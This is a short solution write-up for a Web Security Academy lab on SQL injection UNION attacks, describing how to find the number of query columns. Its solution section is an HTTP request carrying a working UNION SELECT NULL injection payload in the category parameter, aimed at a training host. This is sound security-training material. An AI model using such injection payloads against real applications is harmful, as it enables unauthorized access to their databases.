# Lab 03: SQL injection UNION attack, determining the number of columns returned by the query

## Description

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing null values.

---

## Solution

```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: ac8f1f651f3d085c801e3719006300dd.web-security-academy.net
Cookie: session=wWlafO39rG5te1kEmR750VBVVOttKoUU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```